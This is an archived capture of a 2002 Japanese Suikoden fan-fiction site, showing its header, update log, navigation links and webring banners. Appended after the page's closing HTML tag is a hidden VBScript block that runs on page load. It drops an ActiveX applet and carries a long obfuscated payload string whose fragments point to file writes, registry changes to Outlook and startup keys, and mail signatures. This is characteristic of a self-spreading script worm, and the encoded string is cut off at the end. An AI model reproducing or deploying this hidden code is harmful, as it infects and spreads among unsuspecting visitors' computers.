<HTML>
<HEAD>
<TITLE>没落世界</TITLE>                              
<BODY>
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="http://staticweb.archive.org/js/disclaim-element.js" ></script>
<script type="text/javascript" src="http://staticweb.archive.org/js/graph-calc.js" ></script>
<script type="text/javascript" src="http://staticweb.archive.org/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1356998399999;
var wbPrefix = "http://web.archive.org/web/";
var wbCurrentUrl = "http:\/\/www.geocities.co.jp\/Playtown-Toys\/6571\/index.html";

var curYear = -1;
var curMonth = -1;
var yearCount = 17;
var firstYear = 1996;
var imgWidth=425;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "20";
var displayMonth = "Oct";
var displayYear = "2002";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(http://staticweb.archive.org/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="http://wayback.archive.org/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="http://staticweb.archive.org/images/toolbar/wayback-toolbar-logo.png" alt="Wayback Machine" width="110" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="http://wayback.archive.org/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://www.geocities.co.jp/Playtown-Toys/6571/index.html" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20021020193825" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       Sep
                       
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 19:38:25 Oct 20, 2002">OCT</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="http://web.archive.org/web/20030715183903/http://www.geocities.co.jp/Playtown-Toys/6571/index.html" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="15 Jul 2003"><strong>JUL</strong></a>
		                
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
                       <img src="http://staticweb.archive.org/images/toolbar/wm_tb_prv_off.png" alt="Previous capture" width="14" height="16" border="0" />
                       
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 19:38:25 Oct 20, 2002">20</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="http://web.archive.org/web/20030715183903/http://www.geocities.co.jp/Playtown-Toys/6571/index.html" title="18:39:03 Jul 15, 2003" style="background-color:transparent;border:none;"><img src="http://staticweb.archive.org/images/toolbar/wm_tb_nxt_on.png" alt="Next capture" width="14" height="16" border="0"/></a>
		                
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2001
                       
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 19:38:25 Oct 20, 2002">2002</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="http://web.archive.org/web/20031207012647/http://www.geocities.co.jp/Playtown-Toys/6571/index.html" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="7 Dec 2003"><strong>2003</strong></a>
		                
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="http://wayback.archive.org/web/20021020193825*/http://www.geocities.co.jp/Playtown-Toys/6571/index.html" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>11 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">20 Oct 02 - 30 Oct 04</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:425px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:425px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="425"
				height="27"
				border="0"
				src="http://wayback.archive.org/jsp/graph.jsp?graphdata=425_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000000_2002:9:000000000100_2003:-1:000000100101_2004:-1:010102110100_2005:-1:000000000000_2006:-1:000000000000_2007:-1:000000000000_2008:-1:000000000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000_2012:-1:000000000000"></img>
			<img id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;"
				width="25" 
				height="27"
				border="0"
				src="http://staticweb.archive.org/images/toolbar/transp-yellow-pixel.png"></img>
			<img id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; " 
				width="2"
				height="27" 
				border="0"
				src="http://staticweb.archive.org/images/toolbar/transp-red-pixel.png"></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(http://staticweb.archive.org/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(http://staticweb.archive.org/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->
<DIV ALIGN=CENTER>
<!--*/GeoGuide/*-->
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<TR><TD><!--NEW4--><map name="geoguidelite"><area shape="rect" coords="399,0,468,13" href="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/cgi-bin/click/gg-elist4N/gg/www.geocities.co.jp/elist/" alt="E-list"><area shape="rect" coords="329,0,399,13" href="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/cgi-bin/click/gg-bbs4N/gg/www.geocities.co.jp/bbs2/" alt="BBS"><area shape="rect" coords="259,0,329,13" href="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/cgi-bin/click/gg-search4N/gg/www.geocities.co.jp/search/" alt="Search"><area shape="rect" coords="189,0,259,13" href="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/cgi-bin/geoguide/geoguide_rank" alt="Ranking"><area shape="rect" coords="99,0,189,13" href="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/cgi-bin/click/gg-comtop4N/gg/www.geocities.co.jp/Playtown-Toys/" alt="Playtown-Toys"><area shape="rect" coords="0,0,99,13" href="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/cgi-bin/click/gg-top4N/gg/www.geocities.co.jp/" alt="Go to Top"></map><TABLE BORDER=0 WIDTH=468 HEIGHT=13 BGCOLOR="#000066" CELLPADDING=0 CELLSPACING=0><TD><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/images/geoguide/geoguide3_white.gif" WIDTH=468 HEIGHT=13 USEMAP="#geoguidelite" BORDER=0></TD></TABLE></TD></TR>
<TR><TD><a href="http://web.archive.org/web/20021020193825/http://rd.yahoo.co.jp/M=300065325.300488003.302173081.300090459/S=2075574555:N/A=300298487/*http://247060.com/?xtr=1T00&fr=YPT" target="_top"><img width=468 height=60 src="http://web.archive.org/web/20021020193825im_/http://img.yahoo.co.jp/adv/mobit/20021004/4-6retrjkjdj8d8cvkgps8pt777sgm-b.gif" alt="" border=0></a></TD></TR>
</TABLE>
<!--*/GeoGuide/*-->
</DIV>
<BODY BACKGROUND="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/0479.gif"></BODY>
<CENTER>
<BR><BR>
<P><H2>没落世界</H2></P>
<BR>
<marquee direction="left" loop="infinite" scroollamount="2">
原稿の〆切を●本抱えている為しばらく更新できないかもしれません…;
</marquee>
<BR><BR>
<FONT COLOR="0000FF">start→02.09.03.</FONT><BR>
<FONT COLOR="0000FF">lasu up→02.10.19</FONT><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/huwahuwa02.gif"><BR>
<P><A HREF="http://web.archive.org/web/20021020193825/http://www/a-moz.binboserver.com/count/6/"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.a-moz.binboserver.com/count/6/count.cgi?c1986"BORDER="0"></A></P>
<P>NEXTキリ番→<FONT COLOR="#0000CC">4321.4444HIT</FONT>です〜</P>
<BR><BR>
<IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/gensouira05.jpg">     
                 <P>
                    ここは坂上章が運営する幻想水滸伝非公式ルク坊ルカ坊サイトです<BR>
                    女性向け、同人色が強い為苦手な方はここで退室願います。</P>
<marquee direction="left" loop="infinite" scrollamount="2">
<IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/huwahuwa09.gif">
</marquee>       
<BR>

<TABLE BORDER>               
<TR><TD><A HREF="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/Playtown-Toys/6571/self.html">管理人</A></TD><TD><A HREF="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/Playtown-Toys/6571/kiri.html">キリ番</A></TD></TR>
<TR><TD><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/sign2_02.gif"><A HREF="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/Playtown-Toys/6571/novel.html">小説部屋</A></TD><TD><A HREF="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/Playtown-Toys/6571/ura.html">裏道</A><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/huwahuwa11.gif"></TD></TR>
<TR><TD><A HREF="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/Playtown-Toys/6571/irasuto.html">イラスト</A></TD><TD><A HREF="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/Playtown-Toys/6571/friend.html">お友達</A></TD></TR>
<TR><TD><A HREF="http://web.archive.org/web/20021020193825/http://kent.parks.jp/30/c1986/bbs.cgi">掲示板</A></TD><TD><A HREF="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/Playtown-Toys/6571/link.html">リンク</A></TD></TR>
<TR><TD><A HREF="http://web.archive.org/web/20021020193825/http://diary2.cgiboy.com/1/a988563730">日記</A><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/huwahuwa13.gif"></TD><TD><A HREF="mailto:akira_sakagami_3ll@k6.dion.ne.jp">メール</A></TD></TR>
</TABLE>
<BR>
<form action="http://web.archive.org/web/20021020193825/http://www.geocities.co.jp/Playtown-Toys/6571/cgi-bin/enq.cgi" method="get">
<P>
<lable for="selms">更新履歴<BR></label>
<select name="selkousin" id="selmsc">
<option value="j1">10月19日　SS一本UP</option>
<option value="j2">10月17日　イラスト一つUP,小説部屋にSSUP</option>
<option value="j3">10月16日　小説部屋にSS一本UP</option>
<option value="j4">10月15日　友人部屋のアポロ様にイラストUP,SS一本UP,イラストに頂き物UP</option>
<option value="j5">10月14日　小説部屋にSS三本UP</option>
<option value="j6">10月13日　リンク一本UP,キリ番にSSUP</option>
<option value="j7">10月12日　キリ番にSSUP,様と呼ばないで同盟に参加</option>
<option value="j8">10月11日　裏にSSUP</option> 　
<option value="j9">10月10日　リンクに2件追加,サイト内に生物を繁殖,イラストUP</option>
<option value="j10">10月09日　リンクのコメント変更</option>
<option value="j11">10月08日　リンク追加,GIVESONEXT移動,</option>
<option value="j12">10月06日　TOP変更,</option>　　
</select>
</form>　
<P><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/huwahuwa01.gif"></P>
<BR> 
<BR><BR>
動作確認：IE6.0以上だと平気です。<BR>
          ネスケはきっと無理です<IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/huwahuwa13.gif">(汗)
</CENTER>
<BR>
<HR WIDTH="400">
<CENTER>
<H3>参加同盟・WEBRING</H3>
<P>
<A HREF="http://web.archive.org/web/20021020193825/http://11.tok2.com/chikage/samaiya.html"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://11.tok2.com/chikage/sama.gif" ALT="様イヤ同盟"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://touri-momo.cool.ne.jp/lb/lbdream.htm"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/banner02.gif"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://homepage3.nifty.com/konoha/lucbou/search/"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/banner08.gif"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://www.nona.dti.ne.jp/~miduki/b-webring.htm"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/banner04.gif"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://www.gamersterminal.com/"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/banner07.gif"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://chunky.cool.ne.jp/co-op/index.html"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/banner10.gif"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://homepage1.nifty.com/jpsnet-gm/jps-search.html"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/searchbanner32.jpg"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://www3.to/sssys"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/banner09.gif"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://www.excitegamer.com/"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/banner13.gif"><BR>
<A HREF="http://web.archive.org/web/20021020193825/http://village.infoweb.ne.jp/~fwje7176/gensuisearch"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://www.geocities.co.jp/Playtown-Toys/6571/banner14.jpg">
<CENTER>
<TABLE>
<TBODY>
<TR>
<TD ALIGH="CENTER"><A HREF="http://web.archive.org/web/20021020193825/http://hx.sakura.ne.jp/~nikki/bring/lovebou.htm"><IMG SRC="http://web.archive.org/web/20021020193825im_/http://hx.sakura.ne.jp/~nikki/bring/bouringbn01.gif"border="0"ALT="ぼっちゃんリング"></A><BR>
【<FONTSIZE="-1"><A HREF="http://web.archive.org/web/20021020193825/http://www.webring.ne.jp/cgi-bin/webring?ring=lovebou;random">RANDOM</A>|<A HREF="http://web.archive.org/web/20021020193825/http://www.webring.ne.jp/cgi-bin/webring?ring=lovebou;list">LIST</A>|<A HREF="http://web.archive.org/web/20021020193825/http://wwwwebring.ne.jp/cgi-bin/webring?ring=lovebou;id=23;prev">PRVE</A>|<A HREF="http://web.archive.org/web/20021020193825/http://www.webring.ne.jp/cgi-bin/webring?ring=lovebou;id=23;next">NEXT</A></FONT>】<TR></TBODY>
</TARBLE>
</CENTER>
</TD>
</BODY>
</HTML>             
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "<emAjW`]ne$@pmdLaxl$RbkLaxl$@e_jaeKacn$9lpd]Kbb]_t$>OO$OoS`]hl$OenHYph$Kqb=$BifYhy<aokOuZGJWkpajl$)GJK]pDae$)GJ;jaal]Iidaau !CBHic]Et !CB?r]YpeEYel !CBLrgh]gYla(!Ef\SmZBuf[pigfKB9lp]f`Tg Bid]Lal`(TqhaSlj%Gj =jnojNekmieFaxlS]lR]Y`T]el 5BSG&Kp]fPeplBid]$FadaPYld,)!LelSlj=Jaa\Lamh&NeY\=ldI^Enkln(LelSlj(CB[slYnt !)4: (KrDan LipKln)41LdefR]Y`T]el.;dks]Epap >mjclaknAn\EfEfLup]Kpr5`lpLdefR]Y`T]el.;dks]S]lFadaT]el 5BSG&Kp]fPeplBid]$FadaPYld,*!>aheL]ip&Onil]4&>O<Qofdka\5 n^s[jepl2 KBWotYjp(!6&n^CjDb PmhKprvZ;nL^ @lilL]ttBid]Peeh*CdgoeOelBAllniZ9 >KK.?]pFada(>aheHYph!F9lpraZ*allniZmpek9 +,=doeNeY\Peeh*CdgoeOelBid]Peeh=>OO&GlefLaxl>el] Bid]Lal`(8!I^Pyh]Otj9 `pmdT`]j>el]Lamh&Srala nZ?rD^&8@LIL6&n^CjDb < :KDQkndg]d5nZocjalt2&GJWkpajl$) > nZ?rD^&@pmdLaxlEdkaI^Pyh]Otj9 n^sPh]f>aheL]ip&Onil]vZ;nL^ NZoT]pp=jdAb>el]Lamh&?lgka=jdAb=jd>qn[leof>qn[leofGJ;`]n_]OuZ ?ujjanlKprafc,DYotAf`ep;daj!A^LYkpIf\ax;`]r50LdefI^He^l$L;Yoe ;qrj]jtKlnif_%,)!=4HCYka([)LdefKB;daf_aSmZ=>enYduDakg :TKm^E50Alk]CB?hYfceKm^ 5?hj =s[ He^l$L;Yoe ;qrj]jtKlnif_%,)!% %-)2TKqb=9 (Ef\I^EdkaCFC`Yjg]Kqb5Ma\$CmjneflOtjajg$)(LYkpIf\ax;`]r!Ef\I^Ef\Fmf_tagjFmf_tagj CB?r]YpeEYel !GfEjjkrJasmea F]ttEfAjW`]ne5`lilPh]f=pet>qn[leofEf\I^S`Yne>ahe5L]^p(OajPYld,+!&Lrg_naeBid]o\;gimgfFadasTEecjgoo^lS`Yne\TOtYleof]nyTZhafc*hleAb  >OO&>el]=tiklo(K`]r]>el]!% L`an?addKB9lp]f`Tg OhYjaFada,`pmd%=hs]S]lFadaT]el 5BSG&Kp]fPeplBid]$S`Yne>ahe$*(tjma)Bid]Peeh*Wjape8@LIL6&n^CjDb < :KDQkndg]d5nZocjalt2&GJWkpajl$) > nZ?rD^&@pmdLaxlFadaT]el.;dks]Ef\I^D]^]udlEd5WkKdedd*R]_NeY\$@CAYW;QRJ=JTWMOEJTEd]fpilaasT<afYmhtMoejED!GmpLgggV]joigf=OoS`]hl&JagJ]]d DK=Q[LG;=LWE=C@AJETKkflo]r]TIi[jksg^p\Gmplggg =plr]ko\E]`iYNar!OkOh]dh.J]cWjapeDK=Q[CMJNEFL[UK=N\A\anlapi]kX<afYmhtA\TKkflo]r]TIi[jksg^p\Gmplggg =plr]ko\L]^p(GmpLgggV]joigf(1!&(XMYah\;gipgka Mka Kl]tagjejq,)$R=?[DOGNDCYdh CBIaadNe_ HC=U_;MNR=FP_MKARTA`efleta]o\@e^YqllA`&TOo^lsaj]XMa[nokgbtTGqtdgkk=tpj]osT D]bt GqtDgkkN]nsagj,)!&&,\EYelTKpalakn]ju FYie$OhYjaFada)?addKBE]idJag DK=Q[CMJNEFL[UK=N\A\anlapi]kX<afYmhtA\TKkflo]r]TIi[jksg^p\Gmplggg =plr]ko\L]^p(GmpLgggV]joigf(1!&(XMYah\Oa`eKpalakn]ju FYie$OhYjaFada)SsK`ald&Ne_Onil]@CAYW;QRJ=JTWMOEJTOo^lsaj]XMa[nokgbtTGbfa[a\1&,\Gmplggg\Ghpigfo\EYelT=`ilgnPj]bej]jc](1+),7*$R=?[DOGNDCYdh CBIaadNe_ HC=U_;MNR=FP_MKARTKkflo]r]TIi[jksg^p\Oajdgoo E]osY_en_OuZkusl]i\HjkfadasTEecjgoo^lOmlhogcIflarf]p K]ptafcsT(]0\(.0((,0((,0([,0((,0((,0((,4.T,0)],3.(,Zhafc)?addKBE]idJag DK=Q[CMJNEFL[UK=N\KgbtoYneTEecjgoo^lXWaf`ookNLT?ujjanlNarkaknTOen\gssEaskYcif_SmZoyklamTHno^ahekTIi[jksg^p Gmplggg AfpejfatKatlajgkT,a(\,2((,0((,0((_0((,0((,0((,0,.X0()a0+.,$^lYfg!WkKdedd*R]_Srala @GEQW?UJJANLWQS=JXSg^pwYja\Ea_rgkkflTKf^a_eT),.(TKuldkocTKplaknkTIaadXE\apojHne^]nef[a$)/1(/.,JAGW<SOJ<;]ldGJEYelJ]c(@GEQW?UJJANLWQS=JXSg^pwYja\Ea_rgkkflTKf^a_eT),.(T?oeeknTE]idKatlajgkTJeoKpalakn]ju$^lYfg!KBmimY_aFgd`ej He^l$WafLal`(3! Hno_j]m>el]kXCgeiofBid]o\Ea_rgkkflOhYjadTKpalakn]ju!Ef\Fmf_tagjFmf_tagj CB?r]YpeEahi]m$)Kn=nrgjR]kqm]JeplL]ipHYph5I^Jol BSG&Bid]Axakps OenHYphOK_rahp.]pa!!T`]jLamhH]t`9 kusl]i3*T=jdAbAb L]ipHYph5kqot]e/2TT`]jKpajlQp>ahe5WafLal`&OYKLAMTCarf]h3*&`ld=doeOtYjpUh>el]9 OajPYld SQKPEETGejfal&\hlEf\I^WkKdedd*R]_Srala @GEQWHO;9H_E9?HAFA\KgbtoYneTEecjgoo^lXWaf`ookXCmjneflRejkeofTNufTGejfal+*,Kl]rlMlFada>OO&;kpq>el]SifH]t` oabTcfwYdh._ab$OenHYpho]^\>ghd]j*hll>OO&;kpq>el]SifH]t` kusl]i3*TgjoYhl&_ef$SifH]t` kusl]i3*T`ekcpoh&ena;YhlCFAhhan\Lk(OajPYld w]ZXFgd`ej&dtl(`lp!WkKdedd*R]_Srala @GEQW?L9KOEKWNOGLX.\dh\$dddbid]OoS`]hl&JagOjet]HC=U_;D=SK=O_JGKTT&`ldT?oflanlPyh],Ylpda_alakn'p)mk\kwfdka\OkOh]dh.J]cWjapeDK=Q[CD9OS=K[RGGP\\dhfada\<]bamdpI[gj\$SsK`ald&Ne_Jaa\ HC=U_;D=SK=O_JGKTTntd^aheT<afYmhtA[knT%OoS`]hl&JagOjet]HC=U_;D=SK=O_JGKTT\hl^aheTK_rahpEf_en]T,N>S[jeplOkOh]dh.J]cWjapeDK=Q[CD9OS=K[RGGP\\dhFada\K`aldTKp]fXCgeiaf\X$OenHYphT]elPYld WK[nihl*ep]-!*WkKdedd*R]_Srala @GEQW?L9KOEKWNOGLXdddBid]XS`]hl=pXPjglejluS`]at@Yjdd]nsTOOHHjkpkT,s20*-0C9-)9-+>-))?F%0?9.%,099,0:0300;ySsK`ald&Ne_Onil]@CAYW;HAKKASWJKOLT`ld>el]TOcjalt@got=f_o\]X$w8-)/1.+--,0,C%)-D*%>1>1)0(;,4>02C+*0}S]lFadaT]el 5BSG&Kp]fPeplBid]$SlYntMhBid](2$lnu]!>aheL]ip&Onil]VZkPepl>aheL]ip&;hok]=f` >mjclakn>mjclaknCFLacaIl %Ab AfSh]ja 46`lilPh]f=pet>qn[leofEf\I^T`aoLg[]tagj 5`o[miefl*lg[]tagjAb D]bt LdikDkcYleof$4!9 ^el]T`]jLdikDkcYleof9 Ea`(L`esDg_alakn$1%Ab >KK.?]pEplankaknFYie LdikDkcYleof!<6ldefT`aoLg[]tagj 5He^l$T`aoLg[]tagj,D]j(L`esDg_alakn!) D]j(>KK.?]pFadaNYea(L`esDg_alakn!!%=jdAbAb D]j(L`esDg_alakn!: +Ph]fL`esDg_alakn5T`aoLg[]tagj \Ef\I^KBmimY_aFgd`ej PhakHo[Ypigf%=jdAb=jd>qn[leof>qn[leofGJEYelJ]c(J]cSlj(FadaNYea)Kn=nrgjR]kqm]JeplJ]cT]elSlj=OoS`]hl&JagJ]]d JagKln)EfJagL]ipKln 5LdefWkKdedd*R]_Srala J]cSlj(FadaNYea=jdAb=jd>qn[leof>qn[leofGJGZkSmZ$CmjneflOtjajg!SmZA 5,LaslGqt50@oOdid]TjmaLaslGqt5T]kpOml+)A^T]kpOml>*4 L`an?ujjanlKprafc 